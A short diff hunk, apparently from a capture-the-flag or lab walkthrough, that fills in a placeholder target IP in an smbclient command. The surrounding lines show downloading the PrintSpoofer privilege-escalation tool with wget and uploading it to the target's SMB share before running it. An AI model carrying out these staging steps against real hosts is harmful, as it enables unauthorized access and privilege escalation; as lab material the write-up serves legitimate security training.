@@ -392,7 +392,7 @@ machine:
 
     # wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
 
-    # smbclient // /nt4wrksv     
+    # smbclient //<IP target>/nt4wrksv     
     smb: \> put PrintSpoofer.exe       
                                    
 Run:
